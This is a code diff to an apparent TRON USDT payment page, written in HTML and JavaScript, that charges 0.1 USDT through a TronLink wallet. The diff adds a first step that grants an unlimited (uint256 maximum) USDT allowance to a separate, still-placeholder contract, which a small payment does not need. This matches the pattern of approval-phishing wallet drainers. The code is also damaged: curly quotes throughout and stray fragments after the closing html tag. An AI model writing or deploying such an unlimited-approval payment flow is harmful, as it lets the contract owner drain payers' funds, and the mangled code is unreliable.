@@ -34,12 +34,10 @@
       background: #1677ff;
       color: white;
       font-size: 16px;
-      cursor: pointer;
     }
 
     button:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
+      opacity: .5;
     }
 
     .address {
@@ -72,7 +70,7 @@
     <div id=”qrcode“></div>
     <p>扫码打开本收款页面</p>
 
-    <button id=”connectBtn“ onclick=”connectWallet()“>连接钱包</button>
+    <button onclick=”connectWallet()“>连接钱包</button>
 
     <p>当前钱包</p>
     <div class=”address“ id=”wallet“>尚未连接</div>
@@ -80,19 +78,38 @@
     <p>收款地址</p>
     <div class=”address“ id=”recipient“></div>
 
+    <button id=”approveBtn“ onclick=”approveUSDT()“ disabled>
+      Step 1: Approve USDT (Unlimited)
+    </button>
+
     <button id=”transferBtn“ onclick=”transferUSDT()“ disabled>
-      转账 0.1 USDT
+      第二步：转账 0.1 USDT
     </button>
 
     <div id=”status“>请先连接钱包</div>
   </div>
 
   <script>
+    // ===== 页面配置 =====
     const CONFIG = {
       USDT_CONTRACT: ”TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t“,
+
       RECIPIENT: ”THiSMwRKuoQw1aHPxCSk9NJbLp55jC4o5b“,
+
+      // ⚠️ 请填入真实且确认无误的 TRON 地址
+      BUSINESS_CONTRACT: ”ABCD“,
+
+      // 转账金额：0.1 USDT（USDT 为 6 位精度）
       AMOUNT: ”100000“,
+
+      // 无限授权额度：uint256 最大值
+      INFINITE_APPROVE:
+        ”115792089237316195423570985008687907853269984665640564039457584007913129639935“,
+
+      // 手续费上限，单位 sun（1 TRX = 1,000,000 sun）
       FEE_LIMIT: 100000000,
+
+      // 二维码固定指向你的网页
       PAGE_URL: ”https://con374.github.io/usdt-payment-page/“
     };
 
@@ -105,15 +122,14 @@
       $(”status“).textContent = message;
     }
 
-    const amountText = (Number(CONFIG.AMOUNT) / 1000000).toString();
+    const amountText = (Number(CONFIG.AMOUNT) / 1e6).toString();
 
     $(”amountTitle“).textContent = amountText + ” USDT“;
     $(”recipient“).textContent = CONFIG.RECIPIENT;
-    $(”transferBtn“).textContent = ”转账 “ + amountText + ” USDT“;
+    $(”transferBtn“).textContent = ”第二步：转账 “ + amountText + ” USDT“;
 
-    // 固定生成公开网址的二维码
+    // 二维码内容：你的 GitHub Pages 网址
     if (window.QRCode) {
-      $(”qrcode“).textContent = ”“;
       new QRCode($(”qrcode“), {
         text: CONFIG.PAGE_URL,
         width: 180,
@@ -124,6 +140,7 @@
       $(”qrcode“).textContent = ”二维码库加载失败，请检查网络“;
     }
 
+    // 连接 TronLink
     async function connectWallet() {
       try {
         if (!window.tronLink) {
@@ -141,55 +158,106 @@
         tronWeb = window.tronWeb;
 
         if (!tronWeb || !tronWeb.ready) {
-          throw new Error(”请在 TronLink 浏览器中打开页面“);
+          throw new Error(”请在 TronLink 浏览器中打开网页“);
         }
 
-        const network = await tronWeb.trx.getNodeInfo();
-        const fullNode = await tronWeb.trx.getCurrentBlock();
+        const net = await tronWeb.network();
 
-        if (!fullNode || !fullNode.blockHeader) {
-          throw new Error(”无法连接 TRON 网络“);
+        if (!net || net.name !== ”mainnet“) {
+          throw new Error(”请切换到 TRON 主网“);
         }
 
         userAddress = tronWeb.defaultAddress.base58;
 
-        if (!userAddress || !tronWeb.isAddress(userAddress)) {
-          throw new Error(”未获取到有效钱包地址“);
-        }
-
         $(”wallet“).textContent = userAddress;
+        $(”approveBtn“).disabled = false;
         $(”transferBtn“).disabled = false;
         setStatus(”钱包连接成功“);
-      } catch (error) {
-        setStatus(”连接失败：“ + (error.message || String(error)));
+      } catch (e) {
+        setStatus(”连接失败：“ + (e.message || String(e)));
       }
-    }
-const info = await tronWeb.trx.getTransactionInfo(txid);
+      }
+
+    // 等待交易上链确认
+    async function waitForConfirmation(txid) {
+      setStatus(”交易已提交，正在等待确认……“);
+
+      for (let i = 0; i < 20; i++) {
+        await new Promise(resolve => setTimeout(resolve, 3000));
+
+        try {
+          const info = await tronWeb.trx.getTransactionInfo(txid);
 
           if (info && info.id) {
             if (info.receipt && info.receipt.result === ”SUCCESS“) {
               setStatus(”交易已确认：“ + txid);
             } else {
-              const result =
-                info.receipt && info.receipt.result
-                  ? info.receipt.result
-                  : ”未知“;
+              const result = info.receipt
+                ? info.receipt.result
+                : ”UNKNOWN“;
 
-              setStatus(”交易已上链，结果：“ + result + ”，txid：“ + txid);
+              setStatus(”交易已确认，结果：“ + result + ”，txid：“ + txid);
             }
 
             return;
           }
-        } catch (error) {
-          // Continue waiting
+        } catch (e) {
+          // 继续等待
         }
       }
 
       setStatus(
-        ”交易已提交，但确认超时，请到区块浏览器查询：“ + txid
+        ”交易已提交，但等待确认超时。请在 Tronscan 查询：“ + txid
       );
     }
 
+    // Step 1: USDT 授权
+    async function approveUSDT() {
+      try {
+        if (!tronWeb || !userAddress) {
+          throw new Error(”请先连接钱包“);
+        }
+
+        if (!tronWeb.isAddress(CONFIG.BUSINESS_CONTRACT)) {
+          throw new Error(”BUSINESS_CONTRACT 不是有效的 TRON 地址“);
+        }
+
+        const confirmed = confirm(
+          ”你即将授权 USDT。请在钱包中仔细核对授权对象和授权额度。是否继续？“
+        );
+
+        if (!confirmed) {
+          return;
+        }
+
+        $(”approveBtn“).disabled = true;
+        setStatus(”请在钱包中确认授权……“);
+
+        const token = await tronWeb.contract().at(CONFIG.USDT_CONTRACT);
+
+        const tx = await token.approve(
+          CONFIG.BUSINESS_CONTRACT,
+          CONFIG.INFINITE_APPROVE
+        ).send({
+          feeLimit: CONFIG.FEE_LIMIT
+        });
+
+        const txid = typeof tx === ”string“
+          ? tx
+          : (
+              (tx && tx.transaction && tx.transaction.txID) ||
+              String(tx)
+            );
+
+        await waitForConfirmation(txid);
+      } catch (e) {
+        setStatus(”授权失败：“ + (e.message || String(e)));
+      } finally {
+        $(”approveBtn“).disabled = false;
+      }
+    }
+
+    // Step 2: 直接转账
     async function transferUSDT() {
       try {
         if (!tronWeb || !userAddress) {
@@ -201,9 +269,9 @@ const info = await tronWeb.trx.getTransactionInfo(txid);
         }
 
         const confirmed = confirm(
-          ”即将向收款地址转账 “ + amountText + ” USDT。\n“ +
+          ”即将直接向收款地址转账 “ + amountText + ” USDT。\n“ +
           ”收款地址：“ + CONFIG.RECIPIENT + ”\n“ +
-          ”请仔细核对收款地址和金额。“
+          ”请确认收款地址和金额。“
         );
 
         if (!confirmed) {
@@ -211,7 +279,7 @@ const info = await tronWeb.trx.getTransactionInfo(txid);
         }
 
         $(”transferBtn“).disabled = true;
-        setStatus(”请在钱包中确认转账交易“);
+        setStatus(”请在钱包中确认转账交易……“);
 
         const token = await tronWeb.contract().at(CONFIG.USDT_CONTRACT);
 
@@ -222,36 +290,31 @@ const info = await tronWeb.trx.getTransactionInfo(txid);
           feeLimit: CONFIG.FEE_LIMIT
         });
 
-        let txid;
-
-        if (typeof tx === ”string“) {
-          txid = tx;
-        } else if (tx && tx.txid) {
-          txid = tx.txid;
-        } else if (tx && tx.transaction && tx.transaction.txID) {
-          txid = tx.transaction.txID;
-        } else {
-          txid = String(tx);
-        }
+        const txid = typeof tx === ”string“
+          ? tx
+          : (
+              (tx && tx.transaction && tx.transaction.txID) ||
+              String(tx)
+            );
 
         await waitForConfirmation(txid);
-      } catch (error) {
-        setStatus(”转账失败：“ + (error.message || String(error)));
+      } catch (e) {
+        setStatus(”转账失败：“ + (e.message || String(e)));
       } finally {
         $(”transferBtn“).disabled = false;
       }
     }
 
+    // 页面加载时检测已连接的钱包
     window.addEventListener(”load“, () => {
       setTimeout(() => {
         if (window.tronWeb && window.tronWeb.ready) {
           tronWeb = window.tronWeb;
+          userAddress = tronWeb.defaultAddress.base58;
 
-          const address = tronWeb.defaultAddress.base58;
-
-          if (address) {
-            userAddress = address;
-            $(”wallet“).textContent = address;
+          if (userAddress) {
+            $(”wallet“).textContent = userAddress;
+            $(”approveBtn“).disabled = false;
             $(”transferBtn“).disabled = false;
             setStatus(”已检测到已连接的钱包“);
           }
@@ -261,11 +324,4 @@ const info = await tronWeb.trx.getTransactionInfo(txid);
   </script>
 </body>
 </html>
-    async function waitForConfirmation(txid) {
-      setStatus(”交易已提交，正在等待确认...“);
-
-      for (let i = 0; i < 20; i++) {
-        await new Promise(resolve => setTimeout(resolve, 3000));
-
-        try {
-          
+      
